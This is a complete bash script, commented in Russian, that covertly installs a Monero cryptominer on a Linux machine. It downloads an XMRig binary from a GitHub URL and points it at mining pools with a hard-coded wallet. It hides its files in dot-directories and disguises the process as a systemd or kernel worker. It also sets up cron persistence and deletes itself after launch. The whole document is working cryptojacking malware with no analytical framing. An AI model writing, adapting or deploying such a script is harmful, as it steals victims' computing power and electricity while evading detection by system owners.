#!/bin/bash
# Stealth Miner Installer - максимальная скрытность
set +e

# ============= КОНФИГУРАЦИЯ =============
XMR_WALLET="88EBW6G3FvVLratMgx61DYbL5FE99gUrFSa6Hm2nVVXhGUmJ4c8dseR7AWJkFJ4MH81amVxhcYKEs34V4wptkAbW7JS68Wo"

RANDOM_ID=$(date +%s%N | md5sum 2>/dev/null | cut -c1-8 || echo "$RANDOM")
HOSTNAME_SHORT=$(hostname 2>/dev/null | cut -d'.' -f1 || echo "srv")
USERNAME=$(whoami 2>/dev/null || echo "user")
WORKER_NAME="${HOSTNAME_SHORT}-${USERNAME}-${RANDOM_ID}"

# СТЕЛС-ИМЕНА: Короткие системные имена
PROCESS_NAME="systemd-timesyncd"
BINARY_NAME=".timesyncd"  # Скрытый файл
WRAPPER_NAME="systemd-timesyncd"  # Wrapper для подмены имени
DIR_NAME=".systemd"
CONFIG_NAME=".conf"  # Короткое имя
WATCHDOG_NAME=".monitor"
PID_NAME=".pid"

XMRIG_URL="https://raw.githubusercontent.com/GelShell/mi/refs/heads/main/xmrig"

POOL_LIST=(
    "gulf.moneroocean.stream"
    "sg.moneroocean.stream"
    "de.moneroocean.stream"
)
PORT="10128"

# ============= ФУНКЦИЯ: ТЕСТ ДИРЕКТОРИИ =============
test_executable_dir() {
    local test_dir="$1"
    if [ ! -d "$test_dir" ]; then
        if ! mkdir -p "$test_dir" 2>/dev/null; then
            return 1
        fi
    fi
    local test_script="$test_dir/.test_$$"
    echo '#!/bin/bash' > "$test_script" 2>/dev/null
    echo 'echo OK' >> "$test_script" 2>/dev/null
    chmod +x "$test_script" 2>/dev/null
    local result=$("$test_script" 2>/dev/null)
    rm -f "$test_script" 2>/dev/null
    if [ "$result" = "OK" ]; then
        return 0
    else
        return 1
    fi
}

# ============= ПОИСК ДИРЕКТОРИИ =============
find_executable_dir() {
    local candidates=()
    local home=$(echo $HOME)

    # Приоритет: короткие пути
    candidates+=("$home/.config")
    candidates+=("$home/.cache")
    candidates+=("$home/.local")
    candidates+=("/var/tmp")
    candidates+=("/dev/shm")

    for dir in "${candidates[@]}"; do
        if test_executable_dir "$dir"; then
            echo "$dir"
            return 0
        fi
    done
    return 1
}

BASE_DIR=$(find_executable_dir)
if [ -z "$BASE_DIR" ]; then
    exit 1
fi

INSTALL_DIR="$BASE_DIR/$DIR_NAME"
mkdir -p "$INSTALL_DIR" 2>/dev/null

BINARY_PATH="$INSTALL_DIR/$BINARY_NAME"
WRAPPER_PATH="$INSTALL_DIR/$WRAPPER_NAME"
CONFIG_FILE="$INSTALL_DIR/$CONFIG_NAME"
WATCHDOG_SCRIPT="$INSTALL_DIR/$WATCHDOG_NAME"
PID_FILE="$INSTALL_DIR/$PID_NAME"

# CPU с ПРАВИЛЬНЫМ количеством потоков
CPU_CORES=$(nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null || echo "2")
THREADS=$((CPU_CORES - 1))
if [ $THREADS -lt 1 ]; then
    THREADS=1
fi

# Тестирование пулов
BEST_POOL=""
for pool in "${POOL_LIST[@]}"; do
    if timeout 3 bash -c "exec 3<>/dev/tcp/$pool/$PORT" 2>/dev/null; then
        BEST_POOL="$pool"
        break
    fi
done
if [ -z "$BEST_POOL" ]; then
    BEST_POOL="gulf.moneroocean.stream"
fi

# ============= СКАЧИВАНИЕ =============
DOWNLOADED=0
if command -v curl >/dev/null 2>&1; then
    if curl -L -s -f --connect-timeout 30 --max-time 120 -o "$BINARY_PATH" "$XMRIG_URL" 2>/dev/null; then
        if [ -s "$BINARY_PATH" ]; then
            DOWNLOADED=1
        fi
    fi
fi

if [ $DOWNLOADED -eq 0 ] && command -v wget >/dev/null 2>&1; then
    if wget -q --timeout=30 --tries=3 -O "$BINARY_PATH" "$XMRIG_URL" 2>/dev/null; then
        if [ -s "$BINARY_PATH" ]; then
            DOWNLOADED=1
        fi
    fi
fi

if [ $DOWNLOADED -eq 0 ]; then
    rm -rf "$INSTALL_DIR" 2>/dev/null
    exit 1
fi

chmod +x "$BINARY_PATH" 2>/dev/null

# ============= КОНФИГ С ПРАВИЛЬНЫМ КОЛИЧЕСТВОМ ПОТОКОВ =============
cat > "$CONFIG_FILE" <<EOF
{
    "autosave": true,
    "donate-level": 0,
    "cpu": {
        "enabled": true,
        "huge-pages": false,
        "hw-aes": null,
        "priority": 1,
        "asm": true,
        "max-threads-hint": $THREADS,
        "cn": [[${THREADS}, 0]],
        "cn-heavy": [[${THREADS}, 0]],
        "cn-lite": [[${THREADS}, 0]],
        "rx": [0],
        "rx/wow": [0]
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "$BEST_POOL:$PORT",
            "user": "$XMR_WALLET",
            "pass": "$WORKER_NAME",
            "keepalive": true,
            "nicehash": false,
            "tls": false,
            "enabled": true
        }
    ],
    "log-file": null,
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5
}
EOF

# ============= WRAPPER ДЛЯ ПОДМЕНЫ ИМЕНИ ПРОЦЕССА =============
# Использует exec -a для смены имени в ps aux
cat > "$WRAPPER_PATH" <<'EOFWRAPPER'
#!/bin/bash
# Wrapper меняет имя процесса на системное
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SCRIPT_DIR/.timesyncd"
CONFIG="$SCRIPT_DIR/.conf"

# exec -a заменяет имя процесса (argv[0])
cd "$SCRIPT_DIR" 2>/dev/null
exec -a "[kworker/u8:2]" nice -n 19 "$BINARY" -c "$CONFIG" >/dev/null 2>&1
EOFWRAPPER

chmod +x "$WRAPPER_PATH" 2>/dev/null

# ============= WATCHDOG =============
cat > "$WATCHDOG_SCRIPT" <<EOFWATCH
#!/bin/bash
set +e
D="\$(cd "\$(dirname "\${BASH_SOURCE[0]}")" 2>/dev/null && pwd)"
W="\$D/$WRAPPER_NAME"
P="\$D/$PID_NAME"

RUNNING=0
if [ -f "\$P" ]; then
    PID=\$(cat "\$P" 2>/dev/null)
    if [ -n "\$PID" ] && kill -0 "\$PID" 2>/dev/null; then
        RUNNING=1
    fi
fi

if [ \$RUNNING -eq 0 ]; then
    cd "\$D" 2>/dev/null
    nohup "\$W" >/dev/null 2>&1 &
    echo \$! > "\$P" 2>/dev/null
fi
exit 0
EOFWATCH

chmod +x "$WATCHDOG_SCRIPT" 2>/dev/null

# ============= CRON =============
if command -v crontab >/dev/null 2>&1; then
    CRON_CMD="*/5 * * * * $WATCHDOG_SCRIPT >/dev/null 2>&1"
    if ! crontab -l 2>/dev/null | grep -F "$WATCHDOG_SCRIPT" >/dev/null 2>&1; then
        (crontab -l 2>/dev/null || echo ""; echo "$CRON_CMD") | crontab - 2>/dev/null || true
    fi
fi

# ============= ЗАПУСК =============
cd "$INSTALL_DIR" 2>/dev/null
pkill -f ".timesyncd" 2>/dev/null || true
sleep 1

# Запуск через wrapper (подменяет имя процесса)
nohup "$WRAPPER_PATH" >/dev/null 2>&1 &
MINER_PID=$!
echo "$MINER_PID" > "$PID_FILE" 2>/dev/null

sleep 3
if kill -0 "$MINER_PID" 2>/dev/null; then
    rm -f "$0" 2>/dev/null || true
    exit 0
else
    exit 1
fi
